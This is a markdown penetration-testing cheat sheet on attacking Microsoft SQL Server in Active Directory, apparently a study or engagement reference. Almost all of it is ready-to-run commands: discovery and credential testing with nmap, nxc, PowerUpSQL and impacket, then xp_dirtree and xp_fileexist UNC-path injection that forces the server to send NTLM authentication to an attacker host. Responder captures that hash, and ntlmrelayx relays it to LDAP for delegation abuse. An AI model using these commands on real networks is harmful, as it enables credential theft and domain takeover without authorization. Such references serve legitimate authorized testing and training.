---
tags:
  - Exploitation
  - Foundational
  - SQL
  - Windows
---

## MS SQL in Active Directory
resources: [HackTricks - MSSQL Pentesting](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server.html)

> [!info] SQL Server integrates with AD for authentication. Service accounts often have excessive privileges.

### Discover SQL Servers [Local]
```bash
nmap -p 1433 --script ms-sql-info <TargetRange>
```

```bash
nxc mssql <TargetRange>
```

### PowerUpSQL Discovery [Remote]
```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLInstanceBroadcast
Get-SQLInstanceScanUDP
```

### SPN Enumeration for SQL [Remote]
```powershell
Get-DomainUser -SPN | Where-Object { $_.serviceprincipalname -like "*MSSQL*" }
```

```bash
ldapsearch -x -H ldap://<DC-IP> -D "<User>@<Domain>" -w "<Password>" -b "DC=<Domain>,DC=<TLD>" "servicePrincipalName=*MSSQL*"
```

## MS SQL Authentication

### Windows Authentication [Local]
```bash
impacket-mssqlclient <Domain>/<User>:<Password>@<Target> -windows-auth
```

### SQL Authentication [Local]
```bash
impacket-mssqlclient sa:<Password>@<Target>
```

### PowerUpSQL Connection [Remote]
```powershell
Get-SQLConnectionTest -Instance <Target>
Get-SQLServerInfo -Instance <Target>
```

### Test Credentials [Local]
```bash
nxc mssql <Target> -u <User> -p <Password>
nxc mssql <Target> -u <User> -p <Password> -d <Domain>
```

## UNC Path Injection

> [!danger] Force SQL Server to authenticate to attacker SMB share. Capture or relay NTLM hash.

### Setup Responder [Local]
```bash
responder -I eth0
```

### Trigger UNC Path [Remote]
```sql
EXEC master..xp_dirtree '\\<AttackerIP>\share'
```

```sql
EXEC master..xp_fileexist '\\<AttackerIP>\share\file'
```

### Via Impacket [Local]
```bash
impacket-mssqlclient <User>:<Pass>@<Target> -windows-auth
SQL> xp_dirtree \\<AttackerIP>\share
```

## Hash Relay Attack

### Setup ntlmrelayx [Local]
```bash
impacket-ntlmrelayx -t <RelayTarget> -smb2support
```

### Trigger Authentication [Local]
```bash
impacket-mssqlclient <User>:<Pass>@<SQLServer> -windows-auth
SQL> xp_dirtree \\<RelayAttacker>\share
```

### Relay to LDAP for RBCD [Local]
```bash
impacket-ntlmrelayx -t ldap://<DC-IP> --delegate-access
```

## Post-Authentication Enumeration

### List Databases [Remote]
```sql
SELECT name FROM master.sys.databases
```

### List Users [Remote]
```sql
SELECT name FROM master.sys.server_principals
```

### Check Server Roles [Remote]
```sql
SELECT IS_SRVROLEMEMBER('sysadmin')
```

### Check Impersonation Privileges [Remote]
```sql
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE'
```
